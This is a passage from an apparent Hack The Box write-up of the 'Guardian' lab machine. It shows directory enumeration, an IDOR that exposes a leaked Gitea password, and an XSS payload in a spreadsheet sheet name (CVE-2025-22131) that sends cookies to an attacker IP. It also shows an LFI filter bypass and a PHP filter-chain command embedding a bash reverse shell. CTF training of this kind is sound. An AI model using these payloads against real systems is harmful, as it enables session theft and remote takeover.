</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitignore.swp
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitignore/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitignore_global
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitignore~
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitk
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitkeep
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitlab
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitlab-ci.off.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitlab/merge_request_templates
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitlab-ci.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitlab/issue_templates
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitlab-ci/.env
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitlab/route-map.yml
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitmodules
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:29<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.gitreview
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:30<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.ht_wsr.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccess.bak1
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccess.orig
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccess.sample
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccess.save
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccess_extra
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccess_orig
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccess_sc
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccessBAK
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccessOLD
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htaccessOLD2
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htm
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.html
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htpasswd_test
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.htpasswds
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:31<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.httr-oauth
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:34:38<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /.php
</span></span><span style=display:flex><span>**<span style=color:#f92672>[</span>13:35:10<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  326B  - /admin  -&gt;  http://portal.guardian.htb/admin/**
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:36:10<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /cgi-bin/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:36:19<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /composer.lock
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:36:19<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /composer.json
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:36:19<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  327B  - /config  -&gt;  http://portal.guardian.htb/config/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:36:21<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /config/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:37:08<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /includes/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:37:08<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  329B  - /includes  -&gt;  http://portal.guardian.htb/includes/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:37:13<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  331B  - /javascript  -&gt;  http://portal.guardian.htb/javascript/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:37:21<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    1KB - /login.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:37:49<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /php5.fcgi
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:38:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /server-status/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:38:26<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /server-status
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:38:43<span style=color:#f92672>]</span> <span style=color:#ae81ff>301</span> -  327B  - /static  -&gt;  http://portal.guardian.htb/static/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:05<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /vendor/autoload.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:05<span style=color:#f92672>]</span> <span style=color:#ae81ff>403</span> -  284B  - /vendor/
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:05<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /vendor/composer/autoload_classmap.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:06<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /vendor/composer/autoload_namespaces.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:06<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /vendor/composer/autoload_psr4.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:06<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /vendor/composer/autoload_real.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:06<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /vendor/composer/autoload_static.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:06<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    1KB - /vendor/composer/LICENSE
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:06<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -    0B  - /vendor/composer/ClassLoader.php
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>13:39:06<span style=color:#f92672>]</span> <span style=color:#ae81ff>200</span> -   25KB - /vendor/composer/installed.json
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Task Completed
</span></span></code></pre></div><p>Found out there is <code>/admin</code> endpoint but we can not access straight away but we got the <code>/login.php</code> so lets go baby!</p><p>So we got this.</p><p>The thing is we do not have password yet.</p><p>so lets find it;</p><p><img src=images/pdf.png alt=pdf.png></p><p>in the <em>login page</em> we see a link to a pdf file where we can find the password.</p><p><img src=images/pass.png alt=pass.png></p><p>we got the password as <strong>GU1234 so lets find the email from the emails we got earlier in the acknowledgement page. so lets go…….</strong></p><p>We got one</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>Boone Basden
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>GU0142023@guardian.htb
</span></span></code></pre></div><p>and we are in:</p><p><img src=images/werein.png alt=werein.png></p><p>Now we are in the student portal, there is more endpoints and functions that we can recon</p><p>For <code>My Courses</code>, we can click to <code>View Assignments</code> and <code>View Grades</code>.</p><p>There is nothing we can do at <code>Grades</code> part so let’s move on to <code>Assignments</code> part.</p><p>For the assignments belong to <strong>GU0142023</strong></p><p>user, we can see there is two but it got overdue status so lets click view details to see if we can be able to view the assignments</p><p>We notice that there is a <code>Statistics in Business</code> assignment belong to <code>Business Statistics</code> course with <code>Upcoming</code> status. so lets check it out now together..</p><p><img src=images/submit.png alt=submit.png></p><p>here we can upload a .docx or a .xlsx file and in the process we explore and see the chats page with two chat session from <code>GU6262023</code> and <code>mireielle.feek</code>, there is also a <code>New Chat</code> button where we can select what user we want to chat <a href=http://with.so>with.so</a> we select admin for the time being and start enjoying ourselves.<em><strong>laughs:)</strong></em></p><p><img src=images/chat.png alt=chat.png></p><p> we can see from the url that we are id <code>13</code> and we are chatting with id <code>1</code> which is <em>admin</em>.</p><p>so lets manipulate the user numbers in <em>burpsuite</em> and change it to <strong>0</strong> and see if we can be able to see other user chats.</p><h3 id=idor>IDOR</h3><p><img src=images/burp.png alt=burp.png></p><p>Changing the id from 13 to 2 and we can see the chat session between <strong>jamil.enockson and admin</strong> and Found out the admin gave the <strong>password</strong> for gitea which was <strong>DHsNnk3V503</strong></p><p>so lets update the  <code>/etc/hosts</code> file and add; <strong>gitea.guardian.htb</strong>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>
</span></span><span style=display:flex><span> 10.10.11.84   guardian.htb portal.guardian.htb gitea.guardian.htb
</span></span></code></pre></div><p>For the <code>Notice Board</code> and <code>Profile</code> section, there is nothing to consider as much but when we can leverage to high role, need to double check these part as they may got some function that only belong to specific role.But no so lets continue……</p><p>Let’s check out the <code>gitea</code> one.</p><h3 id=gitea>Gitea</h3><p>So after going to the gitea link we see the cool page like this;</p><p><img src=images/gitea.png alt=gitea.png></p><p>so without thinking lets login, as we know that we got <em>password for gitea</em> from <code>jamil.enockson</code> chat session with admin, chance is that it can be the password for this user too.</p><p><img src=images/loginpage.png alt=loginpage.png></p><p>and boom</p><p><img src=images/in.png alt=in.png></p><p>Ooh i forgot to mention (smiles)this one is a private account and we notice that this user work with admin in two repos, we can see admin doing some git push and git branch for 3 months ago.</p><p>So after much consideration we did recon in here</p><p><img src=images/json.png alt=json.png></p><p>We got the version of <strong>phpoffice/phpspreadsheet is 3.7.0 and phpoffice/phpword is ^1.3</strong></p><p>→ Then we go to our bestie google and search for related vulnerabilites and take a look at this</p><p><a href=https://security.snyk.io/package/composer/phpoffice%2Fphpspreadsheet>phpoffice/phpspreadsheet vulnerabilities</a></p><p>and look for the vulnerable version and got this one <a href=https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746>SNYK-PHP-PHPOFFICEPHPSPREADSHEET-8651746</a> with <a href="https://www.cve.org/CVERecord?id=CVE-2025-22131">CVE-2025-22131</a>.</p><p>.</p><p><strong>CVE-2025-22131</strong></p><p>LETS EXPLOIT THIS THING.</p><p>Taking a look at security advisories <a href=https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx>Cross-Site Scripting (XSS) vulnerability in generateNavigation() function</a> and reading through the summary we know that this was a zero day xss when translated  <code>.xlsx</code> file to <code>.html</code> response representation.</p><p>It only provide <code>Poc</code> to this cve, we gonna adapt this to our machine challenge.</p><p>First we need to create a xlsx file with multiple sheets and then gonna change 1 sheet name to <code>">&lt;img src=x onerror=alert(1)></code>.</p><p>then exploit this thing to get the admin cookie and then escalate this sh*t.</p><p>after using this payload <code>">&lt;img src=x onerror=fetch("http://10.10.14.70/?c="+document.cookie)></code> in order to grab the lecturer cookie to escalate them.</p><p>we just renamed the tittle in the .xlsx file in here i used this <a href=https://www.treegrid.com/FSheet>FSheet</a> with online Excel sheet so we rename the sheet and export to use it.bydhaway we opt for the fastest way/route/trick.</p><p><img src=images/title.png alt=title.png></p><p>so we start our python local server submit the assignment we exported and wait for response in our tunnel and we got our cookie as</p><p><img src=images/cookie.png alt=cookie.png></p><p>so we will inject this new cookie via Dev Tools and refresh the page and boom</p><p><img src=images/lec.png alt=lec.png></p><p>we are the lecturer whos name is sammy.treat . so we gonna try to trick the admin now to click to our doc or link whatsoever so lets go buddy.</p><p>As lectures or the current user we can create reports or new user so yeah juicy.</p><p>after going through the source code we can see csrf in the code and we need to bypass it and do <strong>lfi</strong>,ofcourse if admin is cool.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&lt;?php
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;../includes/auth.php&#39;</span>;
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;../config/db.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!isAuthenticated<span style=color:#f92672>()</span> <span style=color:#f92672>||</span> $_SESSION<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;user_role&#39;</span><span style=color:#f92672>]</span> !<span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;admin&#39;</span><span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    header<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;Location: /login.php&#39;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>    exit<span style=color:#f92672>()</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$report <span style=color:#f92672>=</span> $_GET<span style=color:#f92672>[</span><span style=color:#e6db74>&#39;report&#39;</span><span style=color:#f92672>]</span> ?? <span style=color:#e6db74>&#39;reports/academic.php&#39;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>strpos<span style=color:#f92672>(</span>$report, <span style=color:#e6db74>&#39;..&#39;</span><span style=color:#f92672>)</span> !<span style=color:#f92672>==</span> false<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&lt;h2&gt;Malicious request blocked 🚫 &lt;/h2&gt;&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>   
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>(</span>!preg_match<span style=color:#f92672>(</span><span style=color:#e6db74>&#39;/^(.*(enrollment|academic|financial|system)\.php)$/&#39;</span>, $report<span style=color:#f92672>))</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    die<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;&lt;h2&gt;Access denied. Invalid file 🚫&lt;/h2&gt;&#34;</span><span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>?&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;!DOCTYPE html&gt;
</span></span><span style=display:flex><span>&lt;html lang<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;head&gt;
</span></span><span style=display:flex><span>    &lt;meta charset<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;title&gt;Reports Menu&lt;/title&gt;
</span></span><span style=display:flex><span>    &lt;link href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;../static/vendor/tailwindcss/tailwind.min.css&#34;</span> rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;link href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;../static/styles/icons.css&#34;</span> rel<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;stylesheet&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;style&gt;
</span></span><span style=display:flex><span>        body <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            display: flex;
</span></span><span style=display:flex><span>            height: 100vh;
</span></span><span style=display:flex><span>            overflow: hidden;
</span></span><span style=display:flex><span>            background-color: <span style=color:#75715e>#f3f4f6;</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        .sidebar <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            flex-shrink: 0;
</span></span><span style=display:flex><span>            background-color: <span style=color:#75715e>#1e293b;</span>
</span></span><span style=display:flex><span>            color: white;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        .main-content <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            flex: 1;
</span></span><span style=display:flex><span>            overflow-y: auto;
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    &lt;/style&gt;
</span></span><span style=display:flex><span>&lt;/head&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;body class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bg-gray-100&#34;</span>&gt;
</span></span><span style=display:flex><span>    &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sidebar&#34;</span>&gt;&lt;?php include <span style=color:#e6db74>&#39;../includes/admin/sidebar.php&#39;</span>; ?&gt;&lt;/div&gt;
</span></span><span style=display:flex><span>    &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;main-content&#34;</span>&gt;
</span></span><span style=display:flex><span>        &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;flex-1 p-10&#34;</span>&gt;
</span></span><span style=display:flex><span>            &lt;h1 class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-3xl font-bold mb-6 text-gray-800&#34;</span>&gt;Reports Menu&lt;/h1&gt;
</span></span><span style=display:flex><span>            &lt;div class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;grid grid-cols-1 md:grid-cols-2 gap-6&#34;</span>&gt;
</span></span><span style=display:flex><span>                &lt;a href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;?report=reports/enrollment.php&#34;</span> class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;bg-white p-6 rounded-lg shadow hover:shadow-md transition&#34;</span>&gt;
</span></span><span style=display:flex><span>                    &lt;h2 class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-xl font-semibold text-blue-600&#34;</span>&gt;Enrollment Report&lt;/h2&gt;
</span></span><span style=display:flex><span>                    &lt;p class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text-gray-600&#34;</span>&gt;View enrollment statistics and trends.&lt;/p&gt;
</span></span><span style=display:flex><span>                &lt;/a&gt;.............
</span></span></code></pre></div><p>As from what we see, it got filter out and also got regex in case we can bypass the <code>..</code>, we still can not access the file.</p><p>What if we use <code>,</code> that and then add these <code>enrollment|academic|financial|system</code> end with <code>.php</code></p><p><strong>LFI to RCE</strong></p><p>we gonna try the base64 that it will encode the data then we will copy and decode that out.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/admin/reports.php?report<span style=color:#f92672>=</span>php://filter/convert.base64-encode/resource<span style=color:#f92672>=</span>/etc/passwd/,system.php
</span></span></code></pre></div><p><img src=images/guardian-htb-release-area-machine_admin-reports-5.png alt=guardian-htb-release-area-machine_admin-reports-5.png></p><p>The orginal path is gonna be like this : <code>/var/www/html/config/db.php/</code>. This one is after adding <code>,system.php</code> at the end: <code>/var/www/html/config/db.php/,system.php</code></p><p>We want to know the <code>id</code> so we will chain it with this payload <code>&lt;?php system("id");?></code>.</p><p>find the python script here  <a href=https://github.com/synacktiv/php_filter_chain_generator>php_filter_chain_generator</a> .</p><p>and we got something like this</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>┌──<span style=color:#f92672>(</span>venv<span style=color:#f92672>)</span>─<span style=color:#f92672>(</span>havoc㉿havoc<span style=color:#f92672>)</span>-<span style=color:#f92672>[</span>~/Downloads/htb/guardian<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>└─$ python3 php_filter_chain_generator.py --chain <span style=color:#e6db74>&#39;&lt;?php system(&#34;bash -c &#39;</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.70/4444 0&gt;&amp;1&#39;</span><span style=color:#ae81ff>\&#39;</span><span style=color:#e6db74>&#39;&#34;);?&gt;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> The following gadget chain will generate the following code : &lt;?php system<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.70/4444 0&gt;&amp;1&#39;&#34;</span><span style=color:#f92672>)</span>;?&gt; <span style=color:#f92672>(</span>base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjcwLzQ0NDQgMD4mMSciKTs/Pg<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.M